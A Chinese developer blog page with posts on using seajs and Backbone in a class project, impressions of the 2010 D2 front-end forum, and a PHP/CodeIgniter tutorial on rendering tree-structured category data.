<p>比YUI更酷的是，这个seed完全不用配置，而且足够小巧。下面简单谈谈自己使用seajs的一些感受，不过这么十来天，seajs已经发布0.9正式版了，我使的是beta版，也许有所出入吧。</p>
<ol>
<li>seajs中的require运行就像js中var申明，所谓的代码提升，不管这段代码发在什么地方，require都会先运行，所以这样是无效的,require总是会把所需要的js引入的：
<code>try { JSON; } catch (e ) { require(&quot;libs/json2&quot;); }</code></li>
<li>在定义一个module时，定义依赖关系，最好使用require，只有在某些情况(必须需要条件判断)才使用module.load来根据某种事件来执行某个js文件，<a href="http://github.com/shepherdwind/peersay/blob/master/assets/js/app/app.js#L127" target="_blank">例如此处</a>。</li>
<li><a href="http://github.com/seajs/seajs/issues/40" target="_blank">seajs最好放在js文件根目录上</a>，这样好处理依赖关系，并且可以使用相对路径</li>
<li>最后，虽然seajs约定所有变量输出需要使用module.exports，但是，有些时候，如果必须打破约定，就直接忽视约定吧。规矩是人定的，如何使用才是最重要的。<a href="http://github.com/shepherdwind/peersay/blob/master/assets/js/libs/ckeditor/ckeditor.js" target="_blank">这里</a>使用ckeditor就只能把CKEDITOR释放了。<a href="http://github.com/shepherdwind/peersay/blob/master/assets/js/libs/json.js" target="_blank">这里</a>使用json2.js，都没有define直接用module.load(&#39;libs/json&#39;)了(额，我也刚发现，这样也能用)。
对于Backbone，我觉得如果是简单的模型数据操作，最重要的模块是View。通常模型只需要定义一下url属性和validate方法即可（<a href="http://github.com/shepherdwind/peersay/blob/master/assets/js/app/models/test.js" target="_blank">例如</a>）。url定义当模型调用fetch或者save方法时，向哪一个url发送请求，而validate则是定义save模型属性时，会执行validate方法，如果validate返回错误信息，则save或者set方法将返回error，然后触发error事件，再然后，我们想怎么样就怎么样啦，我们只需要关注发生什么事情了，这就是基于事件模型的js的巨大优势了。Model主要负责数据的操作，从后端返回的JSON对象的所有属性会被copy到Model上，这里，需要非常小心的是，Backbone使用了JSON对象，而JSON全局对象在IE 7中没有，所以只能调用老道的<a href="https://github.com/douglascrockford/JSON-js" target="_blank">json.js</a>。为了不至于报错（关于js对象判断，<a href="http://www.ruanyifeng.com/blog/2011/05/how_to_judge_the_existence_of_a_global_object_in_javascript.html" target="_blank">参考此文</a>），我使用了自认为很酷的。</li>
</ol>
<figure class="highlight"><pre><span class="keyword">try</span> {
  <span class="built_in">JSON</span>;
}<span class="keyword">catch</span> (e){
  module.load(<span class="string">'lib/json'</span>); <span class="comment">//加载json2.js</span>
}
</pre></figure>

<p>对于controller，如果和我一样使用PHP，则需要配置Backbone.emulateHTTP = true;Backbone.emulateJSON = true;并且，所有的路由必须在Backbone.history.start();运行以后才能开始追踪url改变的事件。</p>
<h2 id="-">关于用户体验</h2>
<p>再补充一些关于用户体验的，关于什么是用户体验，每个角色都会有不同的定义，视觉注重美观，而前端的我们呢。刚刚做这个项目时，我最想尝试使用炫酷的技术，那是用户体验的内容吗？在测验中，需要做选择，最初，我使用的是推拽，花了好多时间解决那些选项扰人的关系，拖拽了的是被选中的还是未选中的，拖拽的目的地是选中还是未选中，晕了半天终于搞定了。第二天，看看觉得拖拽实在麻烦，当选择过多时还得提示，怎么提示呢——使用弹窗，使用jQuery UI的Dialog可以华丽的跳出来，然后绚烂地离开。但事实上，这些华丽却阻止了用户的行为，过大的干扰，和直接使用alert没有多少差别。</p>
<p>想想还是尽可能对用户少一些干扰好吧。如此，便整体上重构代码，把花了大半天实现的拖拽效果和弹窗提示并禁止继续选择的代码全部删掉。把所有的选择项目由achor标签改为checkbox，看了很久觉得有些舍不得，但还是都改了，做了一个飞跃的效果（选中一个则从下面的box中跳出到上面，反之亦然）——程序员总是忘不了炫耀自己的技术，尤其是前端。代码简单了，我却有些甘心了。</p>
<p>到了今天终于发布了，拿到班上进行测验。班上同学都非常支持，尤其是女生，刚发有动作了，非常感谢她们。然后，有人发来回馈，找名字找得好累啊，把字调大一些吧。最后，同学说，一个东西跑了其他得都需要往前跳一个位置，眼花缭乱的，干脆把跳跃的效果也删了。这时候Backbone的MVC威力大显，只需要稍微修改一些html模板，然后删除跳跃动画的函数就行了。小小的删除，却删去我费了好多精力写的代码。但是，用户体验与程序员的技术无关啊，我需要的自己的东西给用户使用，这才是真正用户体验所要关注的吧，很多时候使用简单的方法实现就好，关键是有效吧。</p>
<h2 id="-">结束语</h2>
<p>转眼一个下午过去了啊，暂时就写到这里吧，以后再补充。最后发一下发布线上的<a href="http://peerasy.sinaapp.com/" target="_blank">地址</a>，使用测试账户可以登陆玩玩，用户名从被试1-被试31，密码是全拼。</p>
</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/php/" class="post__tag__link">php</a></li><li class="post__tag__item"><a href="/tags/前端/" class="post__tag__link">前端</a></li></ul><a href="/2011/05/15/peer-say/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2010-12-18T20:03:50.000Z" class="post__time">December 19, 2010</time><h1 class="post__title"><a href="/2010/12/19/d2-some-feeling/">第五届D2前端技术论坛的一些感受</a></h1></header><div class="post__main"><p>来到杭州十多天了，恰好赶上<a href="http://www.d2forum.org/" target="_blank">D2前端大会</a>，非常幸运，发过微薄，还觉得不过瘾。</p>
<p>前端这个行业似乎越来越强大了，虽然国内比世界还慢了两年，但<span style="text-decoration: line-through;">从07年淘宝首先招聘前端工程师</span>（根据<a href="http://woooh.com/" target="_blank">Aether</a>提供的信息，此处有误，中国何时开始有前端这个职位无从考证了）。在大会上还看到华为的工程师过来，还有思科来的嘉宾的杜欢，这些看起来和web没有关系的公司都对前端如此有兴趣，让我很是惊讶。</p>
<p>回顾上周刚刚结束的<a href="http://velocity.oreilly.com.cn/" target="_blank">velocity中国web性能大会</a>，D2显得更加本土化。这样也好，让我们首先看看国外大神强如facebook都在干啥，再回顾回顾我们自己，不能只看着硅谷，那些大公司哪个能够在中国的大地占领市场呢。</p>
<h2 id="-">嘉宾</h2>
<p>这次来的嘉宾最有趣的要是来自谷歌的<a href="http://www.d2forum.org/d2/5/guest.html" target="_blank">Hedger</a>了，还好他是华人，汉语讲得够过二甲了。土豆的<a href="http://www.d2forum.org/d2/5/guest.html" target="_blank">杨扬</a>和淘宝系列都源自阿里集团，而阿里的技术又源自雅虎，<a href="http://www.d2forum.org/d2/5/guest.html" target="_blank">Hedger</a>也从雅虎出来的，向雅虎致敬。最后，辣妈的出现，让我们都非常惊喜，呵呵，还有很多人不知道辣妈吧，她是现场唯一的女嘉宾，不过提起今年的js版植物大战僵尸，没有人（前端业内）没有听说过吧，辣妈就是js版植物大战僵尸的作者。辣妈应该说是勇敢的探险者，就像css禅意花园，做了一些伟大的尝试。有些事情从理论上分析也许不难实现，而理论在成为实现之前都只能说是一种可能，把理想实现者，给我们的是希望，现实的希望，我们原来真的可以做到，那么下一个目标也不远了吧。</p>
<h2 id="-">波澜不惊</h2>
<p>这个大会的组织还是非常好的，中途换了酒店反而对我更方便了，走路就可以到达。第一场分享，来自淘宝的“前端技术在电子商务领域的应用与实践”，感觉像是在给淘宝的装修大市场打广告，淘宝作为主办方，这样做也无可厚非，但是，作为一届技术大会，不谈技术占我们那么多时间就不地道了。最后一场来自淘宝<a href="http://www.d2forum.org/d2/5/guest.html#yubo" target="_blank">玉伯</a>的“面向未来的前端类库开发”，感觉kissy还是缺少一些技术含量，至少没有达到前沿水平，与谷歌，fb等比起来，无法我们坐着的听人们目瞪口呆，而且，玉伯的表达能力有待增强。最后的分享环节中，淘宝渡劫和来人人网的俩分享反而不如前面那些无名人士的效果，可有可无吧。</p>
<h2 id="-">波涛汹涌</h2>
<p>大会总是有不少让所有人为之动容之处。首先是<a href="http://www.d2forum.org/d2/5/guest.html" target="_blank">Hedger</a>的讲演，很有大师的感觉，无处不发散着来自世界最优秀团队的一种hack气质。<a href="http://www.d2forum.org/d2/5/guest.html" target="_blank">Hedger</a>首先提出js中的很多问题，然后一一批评了那些世界顶级大师John Resig（jquery作者）和<a href="http://dancewithnet.com/2009/03/29/douglas-crockford/" target="_blank">Douglas Crockford</a>的一些在业界被广为流传，并且大量使用的一些方法。用<a href="http://www.d2forum.org/d2/5/guest.html" target="_blank">Hedger</a>来说，这些都是js中的奇技淫巧<strong>，</strong>我们每个人都是忍者（或者说侠客），缺乏一种统一的模式。jQuery和YUI的比较是没有意义的，他们都是把性能的代价放到了客户端，让用户的电脑来解决js中的问题。</p>
<p>这在我们一般的思维来说，完全没有问题，客户端浏览器运行js，我们在js的范围内开发，但是我们无法预料客户端的浏览器是哪种浏览器，这样就只能做浏览器兼容了，然后出现了无数伟大的js库，然后我们来讨论怎么做一个更好的库吧，jQuery or mootool or YUI Dojo Ext……淘宝说，我们要开发一个适合我们自己的库kissy。这样的思维似乎还无漏洞，淘宝在国内是走在前列。</p>
<p>这样，我们都是在js的范围内思考，那么会上有个90后小伙就问了，你们面对这样一个又一个的括号，你们难道不烦吗？呵呵，一语既出，雷到全场(主持人乌龙表示压力很大)，难道js不是这样写的吗？小伙说，我自己重新编译了js，然后刷刷写代码了，小家伙的思维确实很奇特，不过他应该没过大二吧，在大学的殿堂里慢慢研究吧，会有出息的。用于实际就有些过了(CoffeeScript和underscore的出现，说明，再好的想法只有实现了才能有用，我们还是应该多干活，少说话，把产品做好了才是王道)。</p>
<p><a href="http://dancewithnet.com/2009/03/29/douglas-crockford/" target="_blank">Douglas Crockford</a>在99年为js辩护，称JavaScript曾是“世界上最被误解的语言”，大师一言既出，立即在整个前端界内把js语言翻身为优雅的函数式语言。John Resig大神开发jQuery，更是让无数前端小子感受到js语言本身的独特魅力。就这样，在业界形成了一种共识：JavaScript有其独特的原形继承语言，它的语言中有很多优雅的特性，我们应该尽量避免使用语言中的鸡肋部分，总体上JavaScript是这一门非常优秀的语言。无形中，js带上一顶神圣的光环，90后小家伙居然说重新编译一门语言，这不是讨打么。</p>
<p>但90后前面有<a href="http://www.d2forum.org/d2/5/guest.html" target="_blank">Hedger</a>的演讲谈<a href="http://code.google.com/intl/zh-CN/closure/compiler/" target="_blank">Closure Compiler</a>，其实谷歌在09年就已经开始尝试从编译的角度重新构造js了，<a href="http://code.google.com/intl/zh-CN/closure/compiler/" target="_blank">Closure Compiler</a>的基本思想是：让客户端的js只运行所需要的部分。谷歌的实现是通过<a href="http://code.google.com/intl/zh-CN/closure/compiler/" target="_blank">Closure Compiler</a>工具对js进行重新编译，把js按照一种严格的模式在服务器端首先编译好一份最简单的js文件。这种事情该是多么复杂啊，也只有大神谷歌能这样做吧，也只有谷歌对性内的极限性内要求才有如此需求。这样既不需要修改js语言，又可以以一种非常规范的模式编写js代码，这样的js代码规范在大型项目中非常有用。<a href="http://www.d2forum.org/d2/5/guest.html" target="_blank">Hedger</a>说谷歌的<a href="http://code.google.com/intl/zh-CN/closure/compiler/" target="_blank">Closure </a>库可以自动生成说明文档，这应该与zend frameworks是一样的，否则zend哪有时间写一千多页的api文档，代码及时文档。</p>
<p>最后需要谈谈<a href="http://blog.zhaojie.me/" target="_blank">老赵</a>，他的思想和谷歌的<a href="http://code.google.com/intl/zh-CN/closure/compiler/" target="_blank">Closure Compiler</a>有相似之处，只是相对而言，<a href="http://code.google.com/intl/zh-CN/closure/compiler/" target="_blank">Closure Compiler</a>更加复杂而已。老赵的<a href="http://github.com/JeffreyZhao/jscex" target="_blank">Jscex</a>则是用js语言来改变语言运行的模式，老赵来自盛大，当然专注于游戏行业了，<a href="http://https//github.com/JeffreyZhao/jscex" target="_blank">Jscex</a>对于js游戏开发是一个无比强大的工具。js的异步事件模型是js语言的一个强大的特性，客户端程序通常都是基础事件操作。但是异步事件在一次又一次的循环中（游戏开发中），任何人都只能望洋兴叹了，这一个事件接着一个事件，程序员很快会失去自我。不过，不能不说，Jscex也失去了JavaScript强大的事件驱动，Node.js最大特色之一就是无阻塞的异步执行，也正是建立在事件驱动之上。</p>
<p>在PHP的开发中，我们都被教导，不要使用goto，突然把程序断了，程序员会失去对程序的控制的。但是，js的每一个事件就是一个goto模块，当然，这在模型事件很少的时候我们还能控制场面，但是，面对动画，这一切就无能为力了。动画每隔200毫秒需要一个状态，那每一个状态的变化都需要一个函数，这样需要处理的事件就太多了。这时候flash的时间线反而更有用，<a href="http://github.com/JeffreyZhao/jscex" target="_blank">Jscex</a>使用一个函数来处理一步处理过程，这样，我们就可以像处理一条流水线一样处理动画了。</p>
<p>老赵只用了十分钟，就把全场震撼住了，老赵的语言能以也非常强悍。</p>
<h2 id="-">总结</h2>
<p>会场分两个场，只能呆在一个场，有些遗憾，希望有视频上传。</p>
<p>对于大会的主办方，淘宝要加油才行，虽然淘宝的技术很先进，但还没有达到可以show的前沿水平(Facebook,Twitter,Google级别)，不过淘宝推荐行业发展的精神是非常值得赞赏的。</p>
<p>最后，语言都有其适用的范围，谷歌做谷歌的大型应用，淘宝要重用UI做各种奇形怪状的页面，盛大做游戏，90后幻想就行了。一句话，以用户为中心，以实践为引导。JavaScript已经到了一个需要超越web的时代了，走出浏览器，走向更广泛的空间。</p>
<h2 id="-">扩展</h2>
<ol>
<li><a href="http://www.d2forum.org/d2/5/guest.html" target="_blank">Hedger</a>的<a href="http://calendar.perfplanet.com/2010/coding-better-object-oriented-javascript-with-closure-compiler/" title="Permanent Link to Coding Better Object-Oriented JavaScript with Closure Compiler" target="_blank">Coding Better Object-Oriented JavaScript with Closure Compiler</a></li>
<li><a href="http://www.limboy.com/2010/12/19/module-and-compiler-for-common-js/" title="通用JS时代的模块机制和编译工具" target="_blank">通用JS时代的模块机制和编译工具</a></li>
<li><a href="http://blog.zhaojie.me/2010/12/animations-and-games-based-on-jscex-async.html" target="_blank">基于Jscex.Async的JavaScript动画/游戏</a></li>
</ol>
</div><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a href="/tags/d2/" class="post__tag__link">d2</a></li><li class="post__tag__item"><a href="/tags/前端/" class="post__tag__link">前端</a></li></ul><a href="/2010/12/19/d2-some-feeling/#disqus_thread" class="post__foot-link u-fr">0 COMMENTS</a></footer></article><article class="post"><header class="post__head"><time datetime="2010-07-16T07:30:52.000Z" class="post__time">July 16, 2010</time><h1 class="post__title"><a href="/2010/07/16/hierarchical-data-show-in-html/">树结构数据的html展示实现</a></h1></header><div class="post__main"><p>网页中经常会需要展示一些树结构数据，而现在流行的关系型数据库（比如MySQL）都是以二位的数据形式贮存，对于通常用到的树结构需要转化为二维关系来放在数据库中。关于树结构数据的贮存，Mike Hillyer一文<a href="http://dev.mysql.com/tech-resources/articles/hierarchical-data.html" target="_blank">Managing Hierarchical Data in MySQL</a>有非常详细的描述。</p>
<p>Mike Hillyer提出两种方式：</p>
<p>1、毗邻目录模式(adjacency list model)</p>
<p>2、预排序遍历树算法(modified preorder tree traversal algorithm)</p>
<p>虽然两种方式很好地实现了数据存储过程，但网页显示还需要做得更多。本文仅仅探讨树结构数据的展示部分。</p>
<p>Mike Hillyer的两种模式中，第二种是直接把数据的结构关系转存起来，数据的展示不存在问题（具体细节参考原文）。第一数据结构的存在更容易理解，所以似乎被更多人采用。这种方法的原理是把每个数与其父节点数据的一个标识符一起贮存在一列中，然后就像摸着石子过河一样，找到一个点然后可以得到前一个点（或者后一个点），然后所有的点就都可以穿在一起了。这种方法有些数学中数学归纳法的意味，它的好处在于存储数据时非常清晰——只需要处理数据本身和父节点的关系，而且可扩展性好，数据所处理的关系越少，这大概就是软件所强调的松耦合思想吧。当然这种方法的代价是低效率的查询，通常无法确定整个树的深度，这就需要使用递归查询来获得数据，递归查询数据库对于系统资源的消耗是非常巨大的。此外还有一个致命的缺陷，修改数据时容易出现节点闭合的情况，也就是这些数据围成了一个圈，如下图所示</p>
<figure class="highlight text"><pre><span class="comment">1</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">&gt;2</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">&gt;4</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">&gt;5</span>
<span class="comment">|</span>                    <span class="comment">|</span>
<span class="comment">1&lt;</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">8&lt;</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">7&lt;</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">6</span>
</pre></figure>

<p>1后面的自带元素永远不知道它们起源于1整个节点，一旦出现这种情况就会到时递归查询进入死循环，所以存储过程一定要对数据进行合理性检验（就像结婚需要避免血缘关系）。当然在做中小型网站时，这种方法还是非常好的，而且在数据变换不是很大时可以使用缓存来解决循环查询的问题。</p>
<p>在生产html展示页时，首先要完成的是从数据库中提取数据，并且转换为树结构。假设有如下数据：</p>
<figure class="highlight"><pre><span class="code">+-------------+</span>----------------------<span class="code">+--------+</span>
<span class="header">|          id | name                 | parent |
+-------------+----------------------+--------+</span>
|           1 | 1                    |      0 |
|           2 | 2                    |      0 |
|           3 | 3                    |      0 |
|           4 | 4                    |      2 |
|           5 | 5                    |      2 |
|           6 | 6                    |      3 |
|           7 | 7                    |      3 |
|           8 | 8                    |      6 |
<span class="header">|           9 | 9                    |      6 |
+-------------+----------------------+--------+</span>
</pre></figure>

<p>第一列id为一组数据的标识。用集合来描述这列数据是{1,2{4,5},3{6{8,9},7}},如下图：</p>
<p><img src="/assets/images/tree.jpg" alt="树结构图" title="树结构图"></p>
<p>如果上图依次标上数字，就成为了预排序遍历树算法模式的贮存了，看到如此结构自然想到用在PHP中可以使用如此数组来表示</p>
<figure class="highlight"><pre><span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="keyword">array</span>(<span class="number">4</span>,<span class="number">5</span>),<span class="number">3</span>,<span class="keyword">array</span>(<span class="number">6</span>,<span class="keyword">array</span>(<span class="number">8</span>,<span class="number">9</span>),<span class="number">7</span>));
</pre></figure>

<p>于是尝试了一下如下的测试</p>
<figure class="highlight"><pre><span class="function"><span class="keyword">function</span> <span class="title">unlimitedSortTest</span><span class="params">()</span>
{</span>
    <span class="variable">$arrSort</span> = <span class="keyword">array</span>(
        <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">0</span>),
        <span class="keyword">array</span>(<span class="number">2</span>,<span class="number">0</span>),
        <span class="keyword">array</span>(<span class="number">3</span>,<span class="number">0</span>),
        <span class="keyword">array</span>(<span class="number">4</span>,<span class="number">2</span>),
        <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">2</span>),
        <span class="keyword">array</span>(<span class="number">6</span>,<span class="number">3</span>),
        <span class="keyword">array</span>(<span class="number">7</span>,<span class="number">3</span>),
        <span class="keyword">array</span>(<span class="number">8</span>,<span class="number">6</span>),
        <span class="keyword">array</span>(<span class="number">9</span>,<span class="number">6</span>)
    );
    <span class="variable">$arrResult</span> = <span class="keyword">array</span>(
        <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">array</span>(<span class="number">4</span>,<span class="number">5</span>),<span class="number">3</span>,<span class="keyword">array</span>(<span class="number">6</span>,<span class="keyword">array</span>(<span class="number">8</span>,<span class="number">9</span>),<span class="number">7</span>)
    );
    <span class="variable">$this</span>-&gt;unit-&gt;run(<span class="variable">$this</span>-&gt;_listToTree(<span class="variable">$arrSort</span>),<span class="variable">$arrResult</span>,<span class="string">'分类数据生成测试'</span>);
}
</pre></figure>

<p>依然是使用CI的单元测试类，实现如此算法甚是折腾，一共使用了三个函数，一个作为借口函数调入数据，一个函数通过递归方式遍历所有节点，把数据与数据的深度标识依次存入一个数组中，最后一个函数获取子节点的元素，如果子节点函数返回书为空，递归循环退出。这种方式实现得非常简陋，于数据库结合，需要首先把数据库数据直接提取，然后存入一个数组。事实上，这返回的数据也无法得到上面测试想要得到的结果，数据的展示只需要可以明显看出数据之间的继承关系就可以。最后得到一个如下图的options</p>
<select  name="tests">
<option value="0">1</option>
<option value="10">　11</option>
<option value="11">　12</option>
<option value="20">　　21</option>
<option value="30">　　　31</option>
<option value="40">　　　　41</option>
<option value="41">　　　　42</option>
<option value="42">　　　　43</option>
<option value="32">　　　32</option>
<option value="33">　　　33</option>
<option value="34">　　　34</option>
<option value="22">　　22</option>
<option value="23">　　23</option>
<option value="13">　13</option>
<option value="14">　14</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
</select>

<p>使用空白缩进深度作为树结构的描述方式，看来还是非常不爽，展示得毕竟非常勉强。后来无意中看到另外一种更合适的，真正的树结构：</p>
<select id="role_parents" class="valid" name="role_parents"> <option disabled="disabled" selected="selected" value="label">父级组</option> <option value="网站管理员">网站管理员</option> <option value="测试者11"> ├ 测试者11</option> <option value="测试者21"> ├ 测试者21</option> <option value="测试者2"> │ └ 测试者2</option> <option value="测试者32"> ├ 测试者32</option> <option value="测试者12"> │ ├ 测试者12</option> <option value="测试者1"> │ └ 测试者1</option> <option value="测试者"> └ 测试者</option> </select>

<p>于是又探索起来这种形式的生成过程。最终还是使用了循环查询方法，并且实现了从任意节点获取树的方法getTree，并且还有一个比较关系是否合适的函数_notChildOf。这里只有一个属性db为继承自CI的Model类，转换为其他数据库操作类也非常容易。Ok，就这样啦，最后，除了可以生成上面的选择器，还可以借助比如jQuery的table-tree插件，生成表格数据的树结构。上面Category类中，getTree函数得到的数组中，数组key值就是用来表示数据在整个书中的关系(密码在getChild中的$j中)。</p>
<figure class="highlight"><pre><span class="comment">/**
 *
 * 分类模型父类
 * 在数据库中结构为
 * id       childName       parentName
 * -----------------------------------
 *  1       栏目1           root
 *  2       栏目2           栏目1
 *
 */</span>

<span class="class"><span class="keyword">class</span> <span class="title">CategoryModel</span> <span class="keyword">extends</span> <span class="title">Model</span>{</span>

    <span class="comment">/**
     *
     * 父节点名，对应为数据库中字段
     *
     *<span class="phpdoc"> @var</span> string
     */</span>
    <span class="keyword">protected</span> <span class="variable">$_parent</span>;

    <span class="comment">/**
     *
     * 子节点名，对应为数据库中字段
     *
     *<span class="phpdoc"> @var</span> string
     */</span>
    <span class="keyword">protected</span> <span class="variable">$_child</span>;

    <span class="comment">/**
     *
     * 更节点名
     *
     *<span class="phpdoc"> @var</span> string
     */</span>
    <span class="keyword">protected</span> <span class="variable">$_root</span>;

    <span class="comment">//整体树结构缓存</span>
    <span class="keyword">protected</span> <span class="variable">$_tree</span>;

    <span class="keyword">public</span> <span class="variable">$table</span>;

    <span class="comment">/**
     *
     * 重载Datamapper构造函数
     *
     */</span>
    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span>
    {</span>
        <span class="keyword">parent</span>::__construct();
    }

    <span class="comment">/**
     *
     * 获取树结构，以数组形式展现
     *<span class="phpdoc"> @param</span> $root string 树起点名
     *<span class="phpdoc"> @return</span> array
     */</span>
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTree</span><span class="params">(<span class="variable">$root</span> = NULL)</span>
    {</span>
        <span class="variable">$tree</span> = <span class="variable">$this</span>-&gt;getChild(<span class="variable">$root</span>);
        <span class="variable">$treeNode</span> = <span class="keyword">array</span>();

        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$tree</span>))
        {
            <span class="variable">$parents</span> = array_keys(<span class="variable">$tree</span>);
            <span class="variable">$children</span> = array_values(<span class="variable">$tree</span>);

            <span class="keyword">foreach</span>(<span class="variable">$children</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$child</span>)
            {
                <span class="variable">$parent</span> = explode(<span class="string">'-'</span>,<span class="variable">$parents</span>[<span class="variable">$key</span>]);
                <span class="variable">$parentNext</span> = <span class="keyword">isset</span>(<span class="variable">$parents</span>[<span class="variable">$key</span> + <span class="number">1</span>])?explode(<span class="string">'-'</span>,<span class="variable">$parents</span>[<span class="variable">$key</span>+<span class="number">1</span>]):<span class="keyword">NULL</span>;
                <span class="variable">$level</span> = <span class="variable">$parent</span>[<span class="number">1</span>];
                <span class="variable">$levelNext</span> = <span class="variable">$parentNext</span> ? <span class="variable">$parentNext</span>[<span class="number">1</span>]:<span class="keyword">NULL</span>;

                <span class="keyword">if</span>(<span class="variable">$level</span> == <span class="number">0</span>)
                {
                    <span class="variable">$treeNode</span>[<span class="variable">$child</span>] = <span class="variable">$child</span>;
                }
                <span class="keyword">elseif</span>(<span class="variable">$level</span> &gt; <span class="number">0</span> <span class="keyword">AND</span> <span class="variable">$levelNext</span> <span class="keyword">AND</span> <span class="variable">$levelNext</span> &gt;= <span class="variable">$level</span>)
                {
                    <span class="variable">$treeNode</span>[<span class="variable">$child</span>] = <span class="string">'&amp;nbsp;'</span>.str_repeat(<span class="string">'│&amp;nbsp;'</span>,<span class="variable">$level</span>-<span class="number">1</span>).<span class="string">'├&amp;nbsp;'</span>.<span class="variable">$child</span>;
                }
                <span class="keyword">else</span>
                {
                    <span class="variable">$treeNode</span>[<span class="variable">$child</span>] = <span class="string">'&amp;nbsp;'</span>.str_repeat(<span class="string">'│&amp;nbsp;'</span>,<span class="variable">$level</span>-<span class="number">1</span>).<span class="string">'└&amp;nbsp;'</span>.<span class="variable">$child</span>;
                }
            }
        }

        <span class="keyword">return</span> <span class="variable">$treeNode</span>;
    }

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getParent</span><span class="params">(<span class="variable">$target</span> = <span class="string">''</span>,&amp;<span class="variable">$nodeTree</span> = array<span class="params">()</span>)</span>
    {</span>
        <span class="keyword">if</span>(<span class="variable">$target</span> == <span class="variable">$this</span>-&gt;_root)
        {
            <span class="variable">$nodeTree</span>[] = <span class="variable">$target</span>;
        }
        <span class="keyword">else</span>
        {
            <span class="variable">$this</span>-&gt;db-&gt;select(<span class="variable">$this</span>-&gt;_parent.<span class="string">','</span>.<span class="variable">$this</span>-&gt;_child);

            <span class="variable">$query</span> = <span class="variable">$this</span>-&gt;db-&gt;where(<span class="variable">$this</span>-&gt;_child,<span class="variable">$target</span>)-&gt;get(<span class="variable">$this</span>-&gt;table);
            <span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows() &gt; <span class="number">0</span>)
            {
                <span class="variable">$row</span> = <span class="variable">$query</span>-&gt;row();
                <span class="variable">$nodeTree</span>[] = <span class="variable">$target</span>;
                <span class="variable">$this</span>-&gt;getParent(<span class="variable">$row</span>-&gt;{<span class="variable">$this</span>-&gt;_parent},&amp;<span class="variable">$nodeTree</span>);
            }
        }

        <span class="keyword">return</span> <span class="variable">$nodeTree</span>;
    }

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChild</span><span class="params">(<span class="variable">$target</span> = NULL, &amp;<span class="variable">$nodeTree</span> = array<span class="params">()</span>,&amp;<span class="variable">$j</span> = -<span class="number">1</span>)</span>
    {</span>
        <span class="variable">$target</span> = ! <span class="variable">$target</span>?<span class="variable">$this</span>-&gt;_root:<span class="variable">$target</span>;

        <span class="variable">$this</span>-&gt;select(<span class="variable">$this</span>-&gt;table.<span class="string">'.'</span>.<span class="variable">$this</span>-&gt;_parent.<span class="string">','</span>.<span class="variable">$this</span>-&gt;table.<span class="string">'.'</span>.<span class="variable">$this</span>-&gt;_child);

        <span class="variable">$query</span> = <span class="variable">$this</span>-&gt;db-&gt;where(<span class="variable">$this</span>-&gt;table.<span class="string">'.'</span>.<span class="variable">$this</span>-&gt;_parent,<span class="variable">$target</span>)-&gt;get(<span class="variable">$this</span>-&gt;table);

        <span class="keyword">if</span>(<span class="variable">$query</span>-&gt;num_rows &gt; <span class="number">0</span>)
        {
            <span class="comment">//$i的作用仅仅在于为每一个child提供不同的parent键值</span>
            <span class="variable">$i</span> = <span class="number">1</span>;
            <span class="keyword">foreach</span>(<span class="variable">$query</span>-&gt;result() <span class="keyword">as</span> <span class="variable">$childSlibing</span>)
            {
                <span class="variable">$searchNode</span> = <span class="variable">$childSlibing</span>-&gt;{<span class="variable">$this</span>-&gt;_child};
                <span class="variable">$j</span>++;

                <span class="variable">$nodeTree</span>[<span class="variable">$target</span>.<span class="string">'-'</span>.<span class="variable">$j</span>.<span class="string">'-'</span>.<span class="variable">$i</span>] = <span class="variable">$searchNode</span>;

                <span class="variable">$this</span>-&gt;getChild(<span class="variable">$has_maney</span>,<span class="variable">$searchNode</span>,&amp;<span class="variable">$nodeTree</span>,&amp;<span class="variable">$j</span>);

                <span class="variable">$j</span>--;
                <span class="variable">$i</span>++;
            }
        }

        <span class="keyword">return</span> <span class="variable">$nodeTree</span>;
    }

    <span class="comment">/**
     *
     * 判断两者是否相互包涵，即规定改变
     */</span>
    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_notChildOf</span><span class="params">(<span class="variable">$field</span>)</span>
    {</span>
        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$this</span>-&gt;{<span class="variable">$field</span>}))
        {
            <span class="keyword">return</span> <span class="keyword">FALSE</span>;
        }
        <span class="keyword">else</span>
        {
            <span class="variable">$parents</span> = <span class="variable">$this</span>-&gt;getParent(<span class="variable">$this</span>-&gt;{<span class="variable">$field</span>});
            <span class="keyword">if</span>(in_array(<span class="variable">$this</span>-&gt;{<span class="variable">$this</span>-&gt;_child},<span class="variable">$parents</span>))
            {
                <span class="keyword">return</span> <span class="keyword">FALSE</span>;
            }
            <span class="keyword">else</span>
            {
                <span class="keyword">return</span> <span class="keyword">TRUE</span>;
            }

        }
    }
}
</pre></figure>

